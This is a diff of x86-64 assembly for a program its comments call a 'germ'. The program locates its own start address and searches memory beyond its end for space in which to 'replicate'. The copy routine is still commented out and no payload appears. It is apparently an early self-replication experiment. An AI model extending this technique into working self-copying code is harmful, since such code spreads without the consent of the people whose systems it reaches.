@@ -32,24 +32,21 @@ delta:
     pop         r15
     sub         r15, delta          ; our start address
     mov         [rbp-0x8], r15      ; store start address
-
     mov         [rbp-0x10], rdi     ; store cb address
 
     ; print out the begin execution message
     _print      0x8, exe_str, exe_str_len
 
-;    call        search
+    call        search
 
 ;    call        copy
 
     ; print completion message
-    _print      0x8, comp_str, comp_str_len
-
+;    _print      0x8, comp_str, comp_str_len
 
     ; make call to the callback
     mov         rax, [rbp-0x10]     ; cb address
-    mov         rdi, 0x12345        ; arg0: addr
-    mov         rsi, 0x54321        ; arg1: length
+    mov         rsi, reach          ; arg1: length
     call        rax
 
 exit:
@@ -63,10 +60,10 @@ exit:
 ; print:
 ;       use the linux write syscall to output text string to stdout
 ; in:
-;       ecx-address of string
-;       edx-string length
+;       rcx-address of string
+;       rdx-string length
 ; returns:
-;       eax-#bytes written
+;       rax-#bytes written
 ;
 print:
     xor         rax, rax
@@ -77,32 +74,20 @@ print:
 
 ;------------------------------------------------------------------------------
 ; search:
-;
+;       now begin to search for enough free space
 ; in:
 ; returns:
+;       rdi-address found
 ;
 search:
-    ; now begin to search for enough free space
-    xor         rax, rax            ; search for NULL
-    mov         rdi, rbp            ; start address
-    add         rdi, germ_len       ; start address + length
-    xor         rcx, rcx
-    add         rcx, germ_len       ; counter
-    repnz       scasb
-
-.loop:
-    add         rdi, 0x1
-    cmp         [rdi], al
-    jne         .nospace
-
-    dec         cl
-    cmp         rcx, 0x0
-    jne         .loop
-
-.nospace:
+.find_null:
     xor         rax, rax
-    mov         rax, 0x1
-    jmp         .exit
+    mov         rdi, [rbp-0x8]      ; start address
+    add         rdi, germ_len       ; move pointer to beyond end
+    xor         rcx, rcx
+    add         rcx, reach          ; area in which we can replicate
+    repne       scasw               ; repeat scasw as long as [rdi] does not equal rax
+
 .exit:
     ret
 
@@ -151,7 +136,8 @@ fail_str_len:   equ $-fail_str
 ;------------------------------------------------------------------------------
 ; germ info
 ;
-stack_sz:       dw 0ffh
+stack_sz:       equ 0ffh
+reach:          equ 080h
 
 germ_len:       equ end-_start
 end:
